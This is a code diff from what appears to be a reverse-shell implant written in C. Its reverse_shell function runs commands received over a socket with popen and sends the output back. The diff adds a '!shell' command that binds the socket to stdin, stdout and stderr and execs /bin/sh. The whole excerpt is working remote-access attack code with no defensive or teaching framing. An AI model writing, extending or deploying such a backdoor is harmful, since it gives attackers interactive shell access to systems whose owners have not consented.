@@ -46,18 +46,32 @@ void reverse_shell(const char *host, unsigned int port, unsigned int num_shells)
         send(sock, "Connected!\n", strlen("Connected!\n"), 0);
 
         while (read(sock, input, sizeof(input) - sizeof(cmd_postfix) - 1) > 0) {
-            // Add a postfix to the command to redirect stderr to stdout, s.t.
-            // it is also picked up by fgets
-            char *enter = strstr(input, "\n");
-            strcpy(enter, cmd_postfix);
-            FILE *fp = popen(input, "r");
-            while (fgets(output, sizeof(output), fp) != NULL) {
-                send(sock, output, strlen(output)+1, 0);
+            // "!shell" drops you into a more "usable" shell
+            if (strncmp("!shell", input, strlen("!shell")) == 0) {
+                // Call does not return
+                reverse_shell_classic(sock);
+            } else {
+                // Add a postfix to the command to redirect stderr to stdout, s.t.
+                // it is also picked up by fgets
+                char *enter = strstr(input, "\n");
+                strcpy(enter, cmd_postfix);
+                FILE *fp = popen(input, "r");
+                while (fgets(output, sizeof(output), fp) != NULL) {
+                    send(sock, output, strlen(output)+1, 0);
+                }
+                pclose(fp);
             }
-            pclose(fp);
         }
         close(sock);
     }
+}
+
+void reverse_shell_classic(int sock) {
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    char * args[] = {"/bin/sh", NULL};
+    execve(args[0], args, 0);
 }
 
 // Read the current number of reverse shells we've got going at the moment.
